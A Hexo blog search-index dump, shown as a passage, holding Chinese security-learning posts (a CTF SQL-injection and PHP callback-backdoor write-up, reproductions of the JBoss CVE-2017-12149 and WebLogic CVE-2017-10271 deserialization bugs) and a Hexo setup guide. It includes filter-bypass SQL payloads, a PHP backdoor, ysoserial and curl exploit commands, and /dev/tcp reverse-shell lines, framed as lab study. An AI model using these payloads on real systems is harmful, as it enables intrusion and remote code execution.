接下来要找sql注入的位置了，回到首页发现有个留言搜索(输入ID)的位置，应该会传参数，输入个1，点搜索到了这个页面 根据提示信息，应该是User-Agent头信息不满足 用前文的文件包含看一下so.php的源码 发现了User-Agent头应该设置为 Xlcteam Browser， 发现了构造的sql语句为SELECT * FROM &#39;message&#39; WHERE display=1 AND id=$id 且这个id使用post传递soid参数赋值的 还发现了包含文件 ‘antiinject.php’ 看文件名应该是防sql注入的 SQL注入通过上一步，我们搜集到了sql注入需要的一些信息，这里我们先看一下sql语句的过滤文件antiinject.php 1234567891011121314&lt;?php function antiinject($content) &#123; $keyword = array(&quot;select&quot;, &quot;union&quot;, &quot;and&quot;, &quot;from&quot;, &apos; &apos;, &quot;&apos;&quot;, &quot;;&quot;, &apos;&quot;&apos;, &quot;char&quot;, &quot;or&quot;, &quot;count&quot;, &quot;master&quot;, &quot;name&quot;, &quot;pass&quot;, &quot;admin&quot;, &quot;+&quot;, &quot;-&quot;, &quot;order&quot;, &quot;=&quot;); $info = strtolower($content); for ($i = 0; $i &lt;= count($keyword); $i++) &#123; $info = str_replace($keyword[$i], &apos;&apos;, $info); &#125; return $info; &#125;?&gt; 发现过滤了一些敏感词汇，可以使用双重绕过：SELselectECT =&gt; SELECT 空格也被过滤了，可以使用/**/代表空格 在构造payload时可以使用也被过滤的 “=” 来截断需要使用的敏感词汇 先用order by语句获知列数为4，构造语句查看回显情况 soid=0/**/UNunionION/**/SELselectECT/**/1,2,3,4 构造payload soid=0/**/UNunionION/**/SELselectECT/**/1,usernam=e,userpas=s,4/**/fro=m/**/admi=n 得到后台账户admin及它的ASCII码password 102 117 99 107 114 117 110 116 117 解码得到后台登录密码 fuckruntu 回调函数用拿到的账户密码登录后台发现还没有拿到flag，而是得到了新的信息，网站根目录下已经被上传了小马xlcteam.php 继续用开头的文件包含看源码 12345&lt;?php$e = $_REQUEST[&apos;www&apos;];$arr = array($_POST[&apos;wtf&apos;] =&gt; &apos;|.*|e&apos;,);array_walk($arr, $e, &apos;&apos;);?&gt; 这是个三参数数组回调后门 回调后门利用了php中包含回调函数参数的函数 具体用法可以参考 phith0n师傅在乌云知识库中的文章 创造tips的秘籍——PHP回调后门 在 p师傅 的文章中发现了类似的使用： 这里可以尝试做相同的传参操作 12?www=preg_replacewtf=phpinfo(); 最后使用scandir() 函数列出当前目录下的文件名并打印 12?www=preg_replacewtf=print_r(scandir(&apos;.&apos;)) 得到flag文件名 “恭喜你获得flag2.txt” 用文件包含读取这个文件得到flag！ 总结之前做前面的题时没啥思路总爱看别人的writeup，自己做题时一头雾水，现在好像了解了一些简单的套路。 这道题其实每一步都不是很难，只不过把多个思路结合到一起了，所以对我这种萌新而言蛮耗时间了。 像sql注入那里双写就绕过了，也没有过滤逗号，看到一些师傅在博客上写了脚本，大家可以去参考一下。 做前面的题时还学到了许多其他的知识，这两天做完剩下的几道题就总结一下。 Reference http://www.anquan.us/static/drops/tips-7279.html http://www.zhzzhz.com/recorder/%E5%8D%97%E9%82%AEctf-%E7%BB%BC%E5%90%88%E9%A2%982-writeup.html]]></content>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[理解Java反序列化漏洞(1)]]></title>
    <url>%2F2018%2F11%2F07%2F%E7%90%86%E8%A7%A3Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1%2F</url>
    <content type="text"><![CDATA[0x00 前言这篇博客是对最近以来学习java反序列化漏洞的总结，再由CVE-2017-12149 JBoss 反序列化漏洞和 Webgoat 的分析复现，用到了Burp的插件 Java-Deserialization-Scanner 进而学习了 ysoserial 一个拥有多种不同利用库的Java反序列化漏洞payload生成工具的使用及部分源码分析。 1x00 Java反序列化漏洞1x10 Java序列化与反序列化Java的序列化（Serialize）与反序列化（Deserialize）是对IO流的一种机制。Java序列化的目标是将对象保存到磁盘中或允许在网络中直接传输对象。序列化机制将允许实现序列化的java对象转换成不依赖平台的字节序列，这些字节序列可以保存在磁盘上，或通过网络传输。而Java的反序列化可以把字节序列恢复为Java对象，也就是说序列化将一个Java对象写入IO流中，反序列化从IO流中恢复这个对象，目的是使对象可以脱离Java运行环境，实现多平台之间的通信与持久化存储。 那什么样的对象是允许实现序列化的呢？可序列化类必须实现 Serializable 和 Externalizable 两个接口之一，很多类已经实现了 Serializable ，这个接口是一个标记接口，它只是表示实现它的类是可序列化的。 所有在网上传输的对象的类都应该是可序列化的，主要应用在以下场景： HTTP RMI（Remote Method Invoke 远程方法调用，Java EE 的基础）：是一组维护开发分布式应用程序的API，实现了不同操作系统程序之间的方法调用，其所有传递的参数，返回值都必须实现序列化。 JMX ：JMX是一套标准代理与服务，用户可以在任何Java应用程序中使用它，Weblogic 的管理页面和整个 JBoss 都是基于 JMX 框架。 常用Java序列化与反序列化的方法 123456789#序列化FileOutputStream fos = new FileOutputStream(&quot;file.txt&quot;); //创建一个ObjectOutpuStream() 输出流ObjectOutputStream oos = new ObjectOutputStream(fos);Person test = new SerializableTest(); oos.writeObject(test); //将一个SerializableTest对象输出到输出流中#反序列化FileInputStream fis = new FileInputStream(&quot;file.txt&quot;); //创建一个ObjectInpuStream() 输入流ObjectInputStream ois = new ObjectInputStream(fis);Student st1 = (SerializableTest) ois.readObject(); tips： ObjectOutputStream() 输出流是一个处理流，必须建立在其他节点流的基础之上，这个代码中 ObjectOutputStream() 的输出流建立在一个文件输出流的基础之上 writeObject() 方法将一个对象写入输出流，这时生成了一个”file.txt”的文件，该文件的内容就是 SerializableTest 对象的序列化数据，这里需要注意一点 调用readObject() 方法读取流中的对象，返回一个 Object 类型的 Java 对象，如果程序知道该 Java 对象的类型，可以强制转换 反序列化机制无须通过构造器来初始化 Java 对象 1x20 漏洞成因与影响暴露或间接暴露反序列化 API ，导致用户可以操作传入数据，攻击者可以精心构造反序列化对象并执行恶意代码 最为出名的大概应该是：15年的Apache Commons Collections 反序列化远程命令执行漏洞，其当初影响范围包括：WebSphere、JBoss、Jenkins、WebLogic 和 OpenNMSd等。 2016年Spring RMI反序列化漏洞今年比较出名的：Jackson，FastJson 1x30 漏洞原理先介绍一个相关知识 序列化文件头是 ac ed 00 05 ac ed 声明使用了序列化协议 00 05是序列化协议版本 具体的序列化后二进制字节数据含义可以参考 Java序列化机制原理 ac ed 00 05 经过 base64 编码后为 ro0AB 来看一段代码 12345678910111213141516171819202122232425262728293031public class test&#123; public static void main(String args[]) throws Exception&#123; //定义myObj对象 MyObject myObj = new MyObject(); myObj.name = &quot;hi&quot;; //创建一个包含对象进行反序列化信息的”object”数据文件 FileOutputStream fos = new FileOutputStream(&quot;object&quot;); ObjectOutputStream os = new ObjectOutputStream(fos); //writeObject()方法将myObj对象写入object文件 os.writeObject(myObj); os.close(); //从文件中反序列化obj对象 FileInputStream fis = new FileInputStream(&quot;object&quot;); ObjectInputStream ois = new ObjectInputStream(fis); //恢复对象 MyObject objectFromDisk = (MyObject)ois.readObject(); System.out.println(objectFromDisk.name); ois.close(); &#125;&#125;class MyObject implements Serializable&#123; public String name; //重写readObject()方法 private void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException&#123; //执行默认的readObject()方法 in.defaultReadObject(); //执行打开计算器程序命令 Runtime.getRuntime().exec(&quot;notepad&quot;); &#125;&#125; 这次我们自己写了一个 class 来进行对象的序列与反序列化。 我们看到，MyObject 类有一个公有属性 name ，myObj 实例化后将 myObj.name 赋值为了 “hi” ，然后序列化写入文件 object 。 查看object文件是以ac ed 00 05开头，序列化成功 反序列化时调用重写的readObject()方法，导致了命令执行，打开了记事本 MyObject 类实现了Serializable接口，并且重写了readObject()函数 ，readObject() 方法的作用正是从一个源输入流中读取字节序列，再把它们反序列化为一个对象，并将其返回。 2x00 CVE-2017-121492x10 漏洞成因这个漏洞出现在 JBoss 的 HttpInvoker 组件中的ReadOnlyAccessFilter 过滤器 doFilter() 方法中，此方法没有进行任何安全检查和过滤就尝试对接受的数据进行反序列化，造成了反序列化漏洞。 源码在jboss\server\all\deploy\httpha-invoker.sar\invoker.war\WEB-INF\classes\org\jboss\invocation\http\servlet目录下的ReadOnlyAccessFilter.class文件中,其中doFilter函数代码如下: 12345678910111213141516171819202122232425262728public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException &#123; HttpServletRequest httpRequest = (HttpServletRequest)request; Principal user = httpRequest.getUserPrincipal(); if ((user == null) &amp;&amp; (this.readOnlyContext != null)) &#123; ServletInputStream sis = request.getInputStream(); ObjectInputStream ois = new ObjectInputStream(sis); MarshalledInvocation mi = null; try &#123; mi = (MarshalledInvocation)ois.readObject(); &#125; catch (ClassNotFoundException e) &#123; throw new ServletException(&quot;Failed to read MarshalledInvocation&quot;, e); &#125; request.setAttribute(&quot;MarshalledInvocation&quot;, mi); mi.setMethodMap(this.namingMethodMap); Method m = mi.getMethod(); if (m != null) &#123; validateAccess(m, mi); &#125; &#125; chain.doFilter(request, response); &#125; 可以看到doFilter()方法直接从http请求中获取数据，在没有进行检查或过滤的情况下，尝试调用readobject()方法对数据流进行反序列化操作，因此产生了反序列化漏洞。 影响版本 Jboss AS 5.x Jboss AS 6.x 2x20 分析先使用ysoserial生成序列化payload保存到文件中，然后利用curl命令将内容以POST方式发送到服务器端 ysoserial的用法如下 java -jar ysoserial.jar [payload] &#39;[command]&#39; &gt; poc.ser [payload] ：利用库，根据服务器端程版本不同而不同，若如报错，可尝试更换其他利用库 [command] ：待执行的命令 但实际操作时发现 java -jar ysoserial.jar CommonsCollections1 &quot;touch /tmp/test&quot; &gt; poc.ser 生成的poc 通过 curl http://ip:port/invoker/readonly --data-binary @poc.ser 发送给服务端时，命令正常执行了 可当我想反弹一个shell时，bash -i &gt;&amp; /dev/tcp/127.0.0.1/21 0&gt;&amp;1命令执行失败，因此想对ysoserial工具的源码分析一下。 发现这工具是调用Runtime.getRuntime().exec()方法执行命令，所以先分析一下执行方法的过程，具体生成poc的payload分析之后再学习吧。 判断命令长度不为空，之后先对命令执行了 StringTokenizer() 方法 该方法源码如下 1234567891011121314/** * Constructs a string tokenizer for the specified string. The * tokenizer uses the default delimiter set, which is * &lt;code&gt;&quot;&amp;nbsp;&amp;#92;t&amp;#92;n&amp;#92;r&amp;#92;f&quot;&lt;/code&gt;: the space character, * the tab character, the newline character, the carriage-return character, * and the form-feed character. Delimiter characters themselves will * not be treated as tokens. * * @param str a string to be parsed. * @exception NullPointerException if str is &lt;CODE&gt;null&lt;/CODE&gt; */ public StringTokenizer(String str) &#123; this(str, &quot; \t\n\r\f&quot;, false); &#125; 从StrringTokenizer的部分注释和源码可以看到，StringTokenizer会对/t/n/r/f进行分割，因此我们输入的如下命令 bash -i &gt;&amp; /dev/tcp/127.0.0.1/21 0&gt;&amp;1 会被分割成 1234bash-i&gt;&amp;... 导致命令无法执行，因此我们需要先进行一次base64编码。 tips：在 Webgoat8 中的 Java 反序列化中会直接从用户输入中获取 Base64 的序列化对象，并盲目地反序列化，我们将通过一个序列化对象来利用此漏洞，该对象将出发POP链，以实现 RCE。利用时用到了 Burp 的一个插件 Java-Deserialization-Scanner ，该插件使用时也是基于 ysoserial 工具生成 poc 的。但是在实际利用时需要使用 Hibernate 5 重新编译 ysoserial 的源代码，并对输出 base64 从而生成 payload。ysoserial 源代码的分析我们放到后面在说，由于windows并不自带base64命令，所以需要自己写一个python脚本获取输出之后调用base64实现，可我现在的python水平好像这件事对我来说很麻烦。那怎么办呢！难道要用linux吗？不，通过在线网站 http://jackson.thuraisamy.me/runtime-exec-payloads.html 可以自动生成编码后的代码。 tips：Linux下的${IFS}也可进行编码,${IFS}的hex值是0x20 0x09 0x0a，因此不被分割，可以利用在写shell时的命令中。但是，${IFS}编码后的命令中有空格，文件名中有空格会造成命令解析不完整，写入文件会失败。而在反弹shell命令中，就会导致模糊的重定向错误，所以此处仅作为扩展内容补充说明 2x30 复现这里我们使用了 ysoserial 的 CommonsCollections1 利用库 这里的反弹shell语句是上文在线网站编码后的 netcat 开监听端口 使用curl命令发送请求 curl http://172.16.12.2:8080/invoker/readonly --data-binary @poc.ser 服务器接收到以POST的方式发送的序列化数据，会进行反序列化，执行其中包含的命令，将Shell反弹 3x00 总结对于一个使用了可利用库的Java应用，可以通过审计查找其中的反序列化方法readobject()或者交互式查看流量，寻找是否有序号化数据流(以ac ed 00 05)来查找其输入点，再看有没有进行检查或过滤，最后利用工具ysoserial验证是否存在反序列化漏洞 对Java反序列化有了一些理解，却不够深入。接下来的几篇博客可能不是有关java反序列化的漏洞了，但之后还是要陆陆续续学习一些像ysoserial利用的CommonsCollections和其他一些payload构造源码分析、Java的反射机制等等]]></content>
      <tags>
        <tag>java反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WebLogic XMLDecoder反序列化漏洞]]></title>
    <url>%2F2018%2F11%2F03%2FWebLogic-XMLDecoder%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[前言这是我第一次接触java反序列化漏洞，之前也不会java，调试的过程比较艰辛，其中一些原理其实也没有太清楚，先整理一篇博客回顾一下再继续往下学习吧。CVE-2017-3506 &amp; CVE-2017-10271漏洞产生的原因大致是Weblogic的WLS Security组件对外提供webservice服务，其中使用了XMLDecoder来解析用户传入的XML数据，在解析的过程中出现反序列化漏洞，导致可执行任意命令，攻击者发送精心构造的xml数据甚至能通过反弹shell拿到权限。 环境搭建直接使用github上vulhub中的docker https://github.com/vulhub/vulhub/blob/master/weblogic/CVE-2017-10271 之前我连docker都没用过，参考了这本书入门 Docker—从入门到实践 因为要动态调试，需要开启一个远程调试的端口8053，所以将docker-compose.yml文件改动如下 123456789101112version: &apos;2&apos;services: weblogic: image: vulhub/weblogic ports: - &quot;7001:7001&quot; - &quot;8453:8453&quot; 执行命令 docker-compose up -d 完成搭建，若成功启动，打开浏览器访问http://127.0.0.1:7001应该会出现一个404页面 docker容器搭建完成后，使用命令docker exec -it weblogic /bin/bash 进入容器 修改/root/Oracle/Middleware/user_projects/domains/base_domain/bin/setDomainEnv.sh 文件 找到如下代码段 添加图中的上面两行代码 原来并没有这两行代码 12debugFlag=&quot;true&quot;export debugFlag 添加后运行一下这个脚本，退出并重启容器，这样就开启了debug模式，可以docker ps一下查看容器是否开启了8453端口。 tips：退出容器快捷键 Ctrl+D 因为要远程调试weblogic，而没有源码，所以要把容器中依赖的包拷出来 使用命令docker cp weblogic:/root/Oracle/Middleware/wlserver_10.3 ./WebLogic_jars 这是如果你使用的是windows系统会报错，因为windows对命令行下的路径长度有限制，所以要先进到docker里把要拷的文件夹打个包，再拉下来。 Linux 的打包命令为 zip -r zipname.zip targetdir docker中好像没有zip命令，需要先apt-get install zip一下， 然后再执行zip -r wlserver_10.3.zip wlserver_10.3 这部分jar不全，还要将/root/Oracle/Middleware/modules 拷出来 IDEA远程调试使用idea打开wlserver_10.3，将wlserver_10.3/server/lib和modules这两个文件夹添加到library 添加后，就会发现里面的.jar和.war的包都可以点开了，并且可以搜索里面的一些类和字符串了。 然后开始设置debug，点击Add Configuration... 添加一个Remote设置 端口设置为8453，并且设置Use module classpath 点击debug，出现如下字样，说明已经配置ok。 Connected to the target VM, address: &#39;localhost:8453&#39;, transport: &#39;socket&#39; 在wlserver_10.3/server/lib/weblogic.jar!/weblogic/wsee/jaxws/WLSServletAdapter.class中的handle方法下断点，看看能否击中断点。 以上，就搭建好了docker环境和调试环境，接下来就可以复现和动态调试了。 漏洞复现因为对原理其实也是一知半解，所以先用师傅们的poc复现了一下 现在本地开一个监听端口 nc -l -p 8888 发送如下数据包 tips：/dev/tcp/ 后的ip换成自己的即可 反弹shell成功 查看burp中返回的xml数据，可以清晰的看到调用栈，调用栈在&lt;ns2:frame /&gt;标签中 仔细分析weblogic返回的响应，我们可以大概定位到问题点，我们重点关注&lt;ns2:frame /&gt;标签中class以weblogic开头的部分，这部分就是weblogic处理我们请求的调用栈逻辑，weblogic处理完后就到了XMLDecoder 这样，通过漏洞复现，我们得到了weblogic的处理流程如下（为了方便查看，调用栈顺序为从上到下） weblogic.wsee.jaxws.workcontext.WorkContextServerTube-&gt;processRequest weblogic.wsee.jaxws.workcontext.WorkContextTube-&gt;readHeaderOld weblogic.wsee.jaxws.workcontext.WorkContextServerTube-&gt;receive weblogic.workarea.WorkContextMapImpl-&gt;receiveRequest weblogic.workarea.WorkContextLocalMap-&gt;receiveRequest weblogic.workarea.spi.WorkContextEntryImpl-&gt;readEntry weblogic.wsee.workarea.WorkContextXmlInputAdapter-&gt;readUTF 至此，漏洞复现已经完成，并根据漏洞复现中得到的信息，为动态调试打下了基础。 动态调试从poc中可以看出，这个漏洞是wls-wsat这个接口出了问题，搜索一下文件，发现了wls-wsat.war这个包，打开后点击web.xml查看有哪些接口 进来后发现第一个接口就是我们想要的接口，调用栈和WebLogic servlet的分发机制比较复杂，我也不是很懂emm，只是跟着复现过程发现的函数调用栈跟了一遍流程。 具体流程如下 weblogic.wsee.jaxws.workcontext.WorkContextServerTube123456789101112131415161718public NextAction processRequest(Packet var1) &#123; this.isUseOldFormat = false; if (var1.getMessage() != null) &#123; HeaderList var2 = var1.getMessage().getHeaders(); Header var3 = var2.get(WorkAreaConstants.WORK_AREA_HEADER, true); if (var3 != null) &#123; this.readHeaderOld(var3); this.isUseOldFormat = true; &#125; Header var4 = var2.get(this.JAX_WS_WORK_AREA_HEADER, true); if (var4 != null) &#123; this.readHeader(var4); &#125; &#125; return super.processRequest(var1); &#125; var1为POST传进来的XML数据，var3是xml的头部解析，如果存在（头不为空），就进入readHeaderOld()方法，跟进readHeaderOld() weblogic.wsee.jaxws.workcontext.WorkContextTube123456789101112131415161718protected void readHeaderOld(Header var1) &#123; try &#123; XMLStreamReader var2 = var1.readHeader(); var2.nextTag(); var2.nextTag(); XMLStreamReaderToXMLStreamWriter var3 = new XMLStreamReaderToXMLStreamWriter(); ByteArrayOutputStream var4 = new ByteArrayOutputStream(); XMLStreamWriter var5 = XMLStreamWriterFactory.create(var4); var3.bridge(var2, var5); var5.close(); WorkContextXmlInputAdapter var6 = new WorkContextXmlInputAdapter(new ByteArrayInputStream(var4.toByteArray())); this.receive(var6); &#125; catch (XMLStreamException var7) &#123; throw new WebServiceException(var7); &#125; catch (IOException var8) &#123; throw new WebServiceException(var8); &#125;&#125; 第一步processRequest中我们只把头读了进来，其他的数据还在缓冲区中，使用ByteArrayOutputStream函数读取剩余数据到var4。经过一系列的处理后，如果没有问题就创建WorkContextXmlInputAdapter对象 var6，之后跟进receive() weblogic.wsee.jaxws.workcontext.WorkContextServerTube1234protected void receive(WorkContextInput var1) throws IOException &#123; WorkContextMapInterceptor var2 = WorkContextHelper.getWorkContextHelper().getInterceptor(); var2.receiveRequest(var1);&#125; 继续跟进receiveRequest() weblogic.workarea.WorkContextMapImpl123public void receiveRequest(WorkContextInput var1) throws IOException &#123; ((WorkContextMapInterceptor)this.getMap()).receiveRequest(var1);&#125; 将var1传到了receiveRequest()方法中，继续跟进 weblogic.workarea.WorkContextLocalMap1234567891011121314151617181920public void receiveRequest(WorkContextInput var1) throws IOException &#123; while(true) &#123; try &#123; WorkContextEntry var2 = WorkContextEntryImpl.readEntry(var1); if (var2 == WorkContextEntry.NULL_CONTEXT) &#123; return; &#125; String var3 = var2.getName(); this.map.put(var3, var2); if (debugWorkContext.isDebugEnabled()) &#123; debugWorkContext.debug(&quot;receiveRequest(&quot; + var2.toString() + &quot;)&quot;); &#125; &#125; catch (ClassNotFoundException var4) &#123; if (debugWorkContext.isDebugEnabled()) &#123; debugWorkContext.debug(&quot;receiveRequest : &quot;, var4); &#125; &#125; &#125;&#125; WorkContextEntryImpl.readEntry(var1);对传进来的数据进行处理，具体的代码好像看不太懂，但是跟进！readEntry()！ weblogic.workarea.spi.WorkContextEntryImpl1234public static WorkContextEntry readEntry(WorkContextInput var0) throws IOException, ClassNotFoundException &#123; String var1 = var0.readUTF(); return (WorkContextEntry)(var1.length() == 0 ? NULL_CONTEXT : new WorkContextEntryImpl(var1, var0));&#125; 在这里对var0执行了readUTF()方法，终于看到曙光了，最后一个方法，跟进 weblogic.wsee.workarea.WorkContextXmlInputAdapter123public String readUTF() throws IOException &#123; return (String)this.xmlDecoder.readObject();&#125; 终于执行了readObject()方法，对XMLDecoder对象进行了反序列化，导致远程命令执行。 不用再跟进了，至此远程动态调试完成。 漏洞总结WebLogic没有对XML的数据进行任何的过滤，导致可以构造XML数据，反序列化任意对象，从而RCE，这也就是CVE-2017-3506产生的原因。 这是我第一次对一个漏洞进行完整的复现和调试，其间遇到了许多问题，磕磕绊绊的终于完成了这篇博客，感谢很多师傅的帮助和博客。经过这次尝试，我对java反序列化和漏洞调试有了初步的认识，希望继续努力，早日完成下一篇博客！ ReferenceWeblogic XMLDecoder RCE分析 WebLogic XMLDecoder反序列化漏洞（CVE-2017-10271)漏洞分析 从0开始学习WebLogic(Java)反序列化 (1)]]></content>
      <tags>
        <tag>weblogic反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hexo 从零搭建全过程]]></title>
    <url>%2F2018%2F10%2F25%2Fhexo%E4%BB%8E%E9%9B%B6%E6%90%AD%E5%BB%BA%E5%85%A8%E8%BF%87%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[hexo 搭建 blog 完整演示前言由于我自己的电脑其实搭建之前就有了各种环境，我也不记得啥时候安的了，稀里糊涂搭建好了，中间遇到了许多问题，这里我从头完整的整理一遍。 本篇博客包含的内容如下： 安装git 安装NodeJs 配置环境变量 安装hexo 部署项目并连接 使用hexo 我遇到的一些问题 1.安装 Git Bash我用的是windows环境 下载地址：Git for Windows 安装步骤：打开下载好的安装包，一路next，我不记得安装的时候是不是有添加到环境变量选项了，如果有记得选上，大概是 “add to path” 这样的选项，如果没选我后面会说到环境变量的意义和添加方法。后文每个软件安装都会涉及环境变量的问题，就不提了。 检测安装是否成功：在命令行输入 git version 返回git版本则安装成功 2.安装 NodeJsHexo 是基于NodeJs 的静态博客，而且安装 NodeJs 后自带的 npm 工具在后面下载 hexo 时会用到。 下载地址：Node.JS 安装步骤：一路next的过程中一样注意环境变量的问题，这样就不用后期自己配了 查看版本命令：node -v 3.配置环境变量什么是环境变量？百度百科给的解释是 环境变量（environment variables）一般是指在操作系统中用来指定操作系统运行环境的一些参数，如：临时文件夹位置和系统文件夹位置等。 我们要配置的是Windows中的PATH环境变量 (PATH 中罗列出 shell 输入的执行命令所在的目录) 我对PATH环境变量的理解是，当你在命令行输入一个命令时，系统会自动从C盘的system文件夹下寻找这个命令，如果没有找到，就会从你设置的PATH环境变量中的文件夹下寻找，所以设置环境变量可以让你更方便地在任何目录下使用你安装的软件命令。 那么如果安装时忘记添加PATH了，怎么手动配置呢？ 右击我的电脑 –&gt; 属性 –&gt; 高级系统设置 –&gt; 环境变量，然后对Path变量进行编辑，点击右侧的新建选项，这时左侧的变量列表会出现新的空栏，在空栏中输入你要配置的文件目录，应用后重启命令行即可生效。 4.安装 hexo 好了！该下的都下完了，该配的也配完了，这时可以直接使用npm工具安装hexo了。 安装命令：npm install -g hexo-cli 等待安装完成，如果安装完成后你找不到安装的位置，可以输入 npm config get prefix 命令得到默认安装路径，然后把这个路径添加到环境变量中 查看版本命令：hexo -v 初始化：新建一个空文件夹作为本地blog目录，命令行切换到该目录下执行 hexo init 进行初始化，初始化后文件夹内会生成一些初始化的文件，稍后会讲解其中要使用到的文件作用。 5.部署项目并连接接下来，在 Git hub 上创建项目并使本机能连接到 Git hub 上 创建一个repo，项目名称为 yourname.github.io (yourname 就是你的git hub用户名)，其他配置使用默认即可 回到本机git bash中配置git hub账户信息，依次输入如下几条命令： git config --global user.name &quot;yourname&quot; git config --global user.email &quot;youremail&quot; 创建SSH命令 ssh-keygen -t rsa -C &quot;youremail@example.com&quot; 该命令生成 ssh 密钥，会生成两个文件，一个是私钥，一个是公钥，我们要用到结尾是 .pub 的公钥 将得到的公钥文件用记事本打开，把内容复制下来，在git hub上settings中的SSH and GPG keys中新建一个SSH key，title栏随便取名，key栏把刚才复制的内容粘贴进去即可。 在 git bash 中验证是否成功 输入 ssh -T git@github.com 命令验证是否添加成功 成功连接你就可以进行下一步了 6.使用 hexo 在使用之前先用编辑器打开你blog项目文件夹下的_config.yml文件修改一些配置，添加下面这些配置，其中YourgithubName换成你自己的： 1234deploy: type: git repo: https://github.com/YourgithubName/YourgithubName.github.io.git branch: master 回到git bash中，进入你的blog目录，分别执行以下命令： 123hexo cleanhexo ghexo server 打开浏览器输入 localhost:4000 你就可以在本地看到你blog的样子了 接下来可以新建一篇博客并推到git hub上去 hexo new &quot;name&quot; 命令新建博客，输入该命令后会在你的blog文件下source/_posts目录下生成一个markdown文档，你可以在这个文档中添加博客内容 hexo g命令生成博客内容 hexo d命令将博客推上去 如果成功了，就可以在浏览器中输入 http://yourgithubname.github.io 看到你的个人博客了 7.我遇到的一些问题在搭建过程中我遇到了两个问题 我遇到的第一个问题是执行hexo g命令后生成的是空的，然后推也推不上去 我的解决方法是修改根目录下的 _config.yml 配置文件 修改deploy 节点 原来我们添加的配置为 1234deploy: type: git repo: https://github.com/YourgithubName/YourgithubName.github.io.git branch: master 修改为如下 1234deploy: type: git repo: https://yourname:yourpassword@github.com/YourgithubName/YourgithubName.github.io.git branch: master 且要注意每个配置选项的冒号后面要有一个空格，要严格参照规定格式 我遇到的第二个问题是SSH连接不上，原来在生成SSH密钥的时候，提示输入生成的文件名，我为了方便把它生成到D盘下新建的一个文件夹中，并且改了名字。但在进行SSH连接的时候，好像会默认到你的C盘 C:\Users\user\.ssh 目录下寻找 xx_rsa 密钥文件，所以我把两个密钥复制到了这个目录下并更改了文件名分别为：id_rsq 和 id_rsa.pub 就可以成功连接了。 如果你没遇到相同的问题就不用做以上修改，在配置的过程中可能会出现千奇百怪的问题，希望你第一次遇到问题时先去google搜索一下，可能相同的问题已经被解答过许多次了。]]></content>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hello World]]></title>
    <url>%2F2018%2F10%2F25%2Fhello-world%2F</url>
    <content type="text"><![CDATA[Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new "My New Post" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment]]></content>
  </entry>
</search>
